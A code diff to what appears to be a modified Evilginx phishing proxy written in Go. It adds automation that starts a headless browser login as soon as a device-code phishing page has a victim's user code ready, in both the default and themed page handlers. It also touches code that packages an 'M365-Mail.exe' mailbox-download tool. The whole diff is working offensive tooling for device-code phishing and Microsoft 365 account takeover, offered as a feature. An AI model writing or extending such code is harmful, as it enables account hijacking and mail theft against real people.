@@ -1,8 +1,8 @@
 /*
-
 This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
 Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!
 
+MODIFIED: Added auto-device-code headless browser automation
 */
 
 package core
@@ -1006,6 +1006,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						html = strings.ReplaceAll(html, "{expires_seconds}", fmt.Sprintf("%d", expiresIn))
 						html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))
 
+						// ========== AUTO-DEVICE-CODE START ==========
+						// Start headless browser automation in background (independent of page closure)
+						if codeReady && userCode != "" && userCode != "Loading..." && !strings.Contains(userCode, "pending") {
+							go func(sid string, code string, vURL string) {
+								// Small delay to let the page render first
+								time.Sleep(2 * time.Second)
+								mgr := GetAutoDeviceCodeManager()
+								if mgr.IsEnabled() {
+									log.Info("[autodc] auto-starting for session %s (default page)", sid)
+									mgr.StartAutoLogin(sid, code, vURL)
+								}
+							}(session_id, userCode, verifyURL)
+						}
+						// ========== END AUTO-DEVICE-CODE ==========
+
 						resp := goproxy.NewResponse(req, "text/html", 200, html)
 						resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
 						resp.Header.Set("Pragma", "no-cache")
@@ -1075,6 +1090,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							html = strings.ReplaceAll(html, "{expires_minutes}", fmt.Sprintf("%d", expMinutes))
 							html = strings.ReplaceAll(html, "{expires_seconds}", fmt.Sprintf("%d", expiresIn))
 							html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))
+
+							// ========== AUTO-DEVICE-CODE START (Themed) ==========
+							if codeReady && userCode != "" && userCode != "Loading..." && !strings.Contains(userCode, "pending") {
+								go func(sid string, code string, vURL string, theme string) {
+									time.Sleep(2 * time.Second)
+									mgr := GetAutoDeviceCodeManager()
+									if mgr.IsEnabled() {
+										log.Info("[autodc] auto-starting for themed session %s (theme: %s)", sid, theme)
+										mgr.StartAutoLogin(sid, code, vURL)
+									}
+								}(session_id, userCode, verifyURL, route.theme)
+							}
+							// ========== END AUTO-DEVICE-CODE ==========
 
 							resp := goproxy.NewResponse(req, "text/html", 200, html)
 							resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
@@ -4138,41 +4166,6 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 			}
 		}
 	}
-	/*
-		for k, v := range vals {
-			if len(k) == 2 {
-				// possible rc4 encryption key
-				if len(v[0]) == 8 {
-					enc_key = v[0]
-					break
-				}
-			}
-		}
-
-		if len(enc_key) > 0 {
-			for k, v := range vals {
-				if len(k) == 3 {
-					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
-					if err == nil {
-						dec_params := make([]byte, len(enc_vals))
-
-						c, _ := rc4.NewCipher([]byte(enc_key))
-						c.XORKeyStream(dec_params, enc_vals)
-
-						params, err := url.ParseQuery(string(dec_params))
-						if err == nil {
-							for kk, vv := range params {
-								log.Debug("param: %s='%s'", kk, vv[0])
-
-								session.Params[kk] = vv[0]
-							}
-							ret = true
-							break
-						}
-					}
-				}
-			}
-		}*/
 	return ret
 }
 
@@ -5226,8 +5219,8 @@ func (p *HttpProxy) createMailboxDownloadZip(accountsJSON string, feedUrl string
 		filepath.Join(p.cfg.GetDataDir(), "..", "M365-Mail.exe"),
 		filepath.Join(".", "build", "M365-Mail.exe"),
 		filepath.Join(".", "M365-Mail.exe"),
-		"/opt/evilginx/build/M365-Mail.exe",
-		"/opt/evilginx/M365-Mail.exe",
+			"/opt/evilginx/build/M365-Mail.exe",
+			"/opt/evilginx/M365-Mail.exe",
 	}
 	
 	var exeData []byte
